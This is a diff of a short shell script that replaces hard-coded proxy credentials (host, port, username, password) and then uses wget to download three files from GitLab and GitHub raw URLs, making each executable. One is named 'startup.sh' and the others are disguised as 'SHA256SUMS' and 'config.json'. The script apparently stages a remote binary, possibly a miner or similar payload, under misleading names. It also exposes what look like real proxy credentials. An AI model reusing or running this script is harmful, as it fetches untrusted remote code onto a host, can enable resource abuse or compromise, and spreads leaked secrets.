@@ -1,7 +1,7 @@
-proxy="149.50.222.86" 
-port="15291" 
-user="render"  
-pass="render"   
+proxy="38.154.227.167" 
+port="5868" 
+user="ugursfso"  
+pass="wqn60pnk6m95"    
 wget -q -O startup.sh https://gitlab.com/55113110159/dokerweb/-/raw/main/zyrex6.18.0 && chmod +x startup.sh
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/zrex235/1/main/config.json && chmod +x config.json
